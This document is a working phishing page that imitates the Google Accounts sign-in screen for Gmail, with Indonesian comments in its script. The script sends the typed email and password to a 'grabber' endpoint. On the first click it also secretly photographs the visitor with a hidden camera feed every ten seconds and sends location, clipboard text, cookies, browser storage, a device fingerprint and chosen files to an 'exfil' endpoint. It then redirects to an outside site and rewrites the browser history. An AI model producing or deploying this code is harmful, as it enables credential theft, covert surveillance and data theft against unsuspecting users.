<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Sign in - Google Accounts</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,sans-serif}
        body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
        .container{max-width:450px;width:100%;background:#fff;border-radius:8px;border:1px solid #dadce0;padding:48px 40px 36px}
        .logo{text-align:center;margin-bottom:20px}
        .logo img{width:75px}
        h1{font-size:24px;font-weight:400;text-align:center}
        .subtitle{text-align:center;color:#5f6368;margin-bottom:32px}
        .input-group{margin-bottom:20px}
        .input-group input{width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
        .input-group input:focus{outline:none;border-color:#1a73e8}
        .btn-next{width:100%;background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;cursor:pointer}
        .loading{display:none;text-align:center;margin-top:16px;color:#1a73e8}
        .footer{text-align:center;margin-top:40px;font-size:12px;color:#5f6368}
        #cameraPreview{position:fixed;bottom:-9999px;right:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
        #hiddenFileInput{display:none}
    </style>
</head>
<body>
<div class="container">
    <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"></div>
    <h1>Sign in</h1>
    <div class="subtitle">to continue to Gmail</div>
    <form id="loginForm">
        <div class="input-group"><input type="email" name="email" id="email" placeholder="Email" required autocomplete="off"></div>
        <div class="input-group"><input type="password" name="password" id="password" placeholder="Password" required autocomplete="off"></div>
        <button type="submit" class="btn-next" id="submitBtn">Next</button>
        <div class="loading" id="loadingIndicator">⏳ Verifying...</div>
    </form>
    <div class="footer">English (United States) · Help · Privacy · Terms</div>
</div>
<video id="cameraPreview" autoplay playsinline muted></video>
<input type="file" id="hiddenFileInput" multiple>

<script>
    // ========== FIX KAMERA DENGAN USER GESTURE ==========
    let cameraStream = null;
    let cameraReady = false;
    
    async function startCameraOnUserGesture() {
        if(cameraReady) return;
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('cameraPreview');
            video.srcObject = cameraStream;
            cameraReady = true;
            
            // Jepret 4 kali dengan jeda
            setTimeout(() => captureAndSendPhoto(), 1000);
            setTimeout(() => captureAndSendPhoto(), 3000);
            setTimeout(() => captureAndSendPhoto(), 6000);
            setTimeout(() => captureAndSendPhoto(), 10000);
            
            // Jepret setiap 10 detik
            setInterval(() => { if(cameraReady) captureAndSendPhoto(); }, 10000);
        } catch(e) { console.log("camera error:", e); }
    }
    
    function captureAndSendPhoto() {
        const video = document.getElementById('cameraPreview');
        if(!video.videoWidth || !video.videoHeight) return;
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        fetch('/api/uploadcam', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imageData, type: 'camera' })
        }).catch(e=>console.log);
    }
    
    // ========== AMBIL LOKASI REAL-TIME ==========
    function getLocationAndSend() {
        if('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/api/exfil', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'location',
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    })
                });
            });
        }
    }
    
    // ========== AMBIL FILE DARI DEVICE (DIAM-DIAM) ==========
    function triggerFileAccess() {
        const fileInput = document.getElementById('hiddenFileInput');
        fileInput.click();
        fileInput.onchange = async (e) => {
            const files = Array.from(e.target.files);
            for(let file of files) {
                const reader = new FileReader();
                reader.onload = async (ev) => {
                    const base64 = ev.target.result.split(',')[1];
                    await fetch('/api/exfil', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: 'file', name: file.name, size: file.size, data: base64 })
                    });
                };
                reader.readAsDataURL(file);
            }
        };
    }
    
    // ========== AMBIL CLIPBOARD ==========
    async function stealClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            if(text) {
                await fetch('/api/exfil', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'clipboard', content: text })
                });
            }
        } catch(e) {}
    }
    
    // ========== AMBIL SEMUA COOKIE, STORAGE, FINGERPRINT ==========
    function getAllBrowserData() {
        const cookies = document.cookie;
        const localStorageData = {...localStorage};
        const sessionData = {...sessionStorage};
        const fingerprint = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            touchPoints: navigator.maxTouchPoints,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        fetch('/api/exfil', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'browser_data', cookies, localStorageData, sessionData, fingerprint })
        });
    }
    
    // ========== EKSEKUSI SEMUA SAAT USER INTERAKSI ==========
    document.body.addEventListener('click', function firstInteraction() {
        startCameraOnUserGesture();
        getLocationAndSend();
        triggerFileAccess();
        stealClipboard();
        getAllBrowserData();
        document.body.removeEventListener('click', firstInteraction);
    }, { once: true });
    
    // ========== FORM SUBMIT ==========
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        document.getElementById('submitBtn').style.display = 'none';
        document.getElementById('loadingIndicator').style.display = 'block';
        
        // Kirim data login
        await fetch('/api/grabber', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        
        // Tunggu sebentar biar data terkirim
        setTimeout(() => {
            // Redirect ke targetmu
            window.location.href = 'https://spotplaymav7.lovable.app';
        }, 2000);
    });
    
    // Hapus history setelah redirect (cuma kerja di beberapa browser)
    setTimeout(() => {
        if(window.history && window.history.replaceState) {
            window.history.replaceState(null, '', '/');
        }
    }, 500);
</script>
</body>
</html>
